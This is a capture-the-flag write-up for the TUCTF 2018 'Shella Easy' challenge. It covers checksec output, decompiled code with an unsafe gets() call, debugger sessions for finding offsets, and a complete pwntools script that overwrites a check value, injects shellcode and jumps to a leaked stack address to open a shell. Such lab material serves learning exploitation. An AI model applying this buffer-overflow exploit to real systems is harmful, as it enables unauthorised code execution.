
# Shella Easy

Program leaks a stack address

```
./shella-easy

Yeah I'll have a 0xfff446b0 with a side of fries thanks

```

NX disabled

```
checksec --file=shella-easy --format=json | jq .

{
  "shella-easy": {
    "relro": "partial",
    "canary": "no",
    "nx": "no",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "2"
  }
}
```

Source code, takes the input of a **64** byte buffer into the culnerable `gets()` function. Then it checks to see if a variable has changed from `0xcafebabe` to ` 0xdeadbeef`. If it has, it does not execute `exit`.

```c
undefined4 main(void)

{
  char input [64];
  int check;
  
  setvbuf(_stdout,(char *)0,2,20);
  setvbuf(_stdin,(char *)0b0,2,20);
  check = L'\xcafebabe';
  printf("Yeah I\'ll have a %p with a side of fries thanks\n",input);
  gets(input);
  if (check != L'\xdeadbeef') {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return 0;
}
```

`input` is at an offset of **0x4c** (**-76**) bytes.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     08048556(R)  
             undefined4        Stack[-0xc]:4  check                                   XREF[2]:     0804851b(W), 
                                                                                                   08048541(R)  
             undefined1[64]    Stack[-0x4c]   input                                   XREF[2]:     08048522(*), 
                                                                                                   08048535(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:080483f7(*), 08048630, 
                                                                                          080486a0(*)  
```

Taking a closer look at the comparison check to confirm, `0xdeadbeef` is checked against the value starting at `ebp-0x8` (**64**). 

```
disassemble main
...
   0x0804853e <+99>:    add    esp,0x4
   0x08048541 <+102>:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048548 <+109>:   je     0x8048551 <main+118>
   0x0804854a <+111>:   push   0x0
   0x0804854c <+113>:   call   0x80483a0 <exit@plt>
   0x08048551 <+118>:   mov    eax,0x0
   0x08048556 <+123>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 <+126>:   leave
   0x0804855a <+127>:   ret
End of assembler dump.
```

Set a breakpoint at the `cmp` instruction

```
pwndbg> b *main+102
Breakpoint 1 at 0x8048541
```

Run the program, fill the **64** byte buffer + `0xdeadbeef` and confirm that the check value  `0xcafebabe` has been overwritten and the `je` is passed.

```
pwndbg> run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*64 + pwn.p32(0xdeadbeef))')

Starting program: /home/wither/NOTES/TUCTF/2018/Shella-Easy/shella-easy < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*64 + pwn.p32(0xdeadbeef))')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Yeah I'll have a 0xffffce00 with a side of fries thanks

Breakpoint 1, 0x08048541 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
 EAX  0xffffce00 ◂— 0x41414141 ('AAAA')
 EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 1
 ECX  0xf7fa58ac (_IO_stdfile_0_lock) ◂— 0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x8048560 (__libc_csu_init) ◂— push ebp
 EBP  0xffffce48 ◂— 0
 ESP  0xffffce00 ◂— 0x41414141 ('AAAA')
 EIP  0x8048541 (main+102) ◂— cmp dword ptr [ebp - 8], 0xdeadbeef
───────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x8048541  <main+102>                      cmp    dword ptr [ebp - 8], 0xdeadbeef     0xdeadbeef - 0xdeadbeef     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x8048548  <main+109>                    ✔ je     main+118                    ...
```

Now that we pass the `cmp`, we need to find the padding to return address, so that we can overwrite that to point to shellcode. Set a breakpoint at the return address

```
...
   0x0804854c <+113>:   call   0x80483a0 <exit@plt>
   0x08048551 <+118>:   mov    eax,0x0
   0x08048556 <+123>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 <+126>:   leave
   0x0804855a <+127>:   ret
End of assembler dump.
...

 b *main+127
Breakpoint 1 at 0x804855a
```

Use the same payload as before + a cylic pattern, then look up the pattern overwritten into the return address to find the offset of **8**. 

```
pwndbg> run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A" * 64 + pwn.p32(0xdeadbeef) + pwn.cyclic(20))')

...
 ► 0x804855a <main+127>    ret                                <0x61616163>
    ↓
...

pwndbg> cyclic -l 0x61616163
Finding cyclic pattern of 4 bytes: b'caaa' (hex: 0x63616161)
Found at offset 8
```

Now that we have control of the return address, we can write an exploit that will write shellcode onto the stack, pass the check and then return to execute it.

```python
#!/usr/bin/python3

# import pwntools
from pwn import *
# import re for regex
from re import *

# only show errors
context.log_level = 'ERROR'

# start the binary process
context.binary = ELF("./shella-easy", checksec=False)
p = process()

# grab the stack address leaked by the program
line = p.recvline().decode().strip()
leaked_addr = int(search(r'0x[\da-f]+', line).group(), 16)

# generate shellcode that will open a shell
shellcode = asm(shellcraft.sh())
# add the shellcode + padding to fill 64B buffer + 0xdeadbeef to pass check + 8B padding to ret + address of shellcode to return to and execute
payload = shellcode + b"A" * (64 - len(shellcode)) + p32(0xdeadbeef) + b"B" * 8 + p32(leaked_addr)

# send the payload and enter interactive mode for the shell
p.sendline(payload)
p.interactive()
```

Running the exploit opens a shell

```shell
python3 exploit.py

$ ls
README.md  exploit.py  shella-easy
```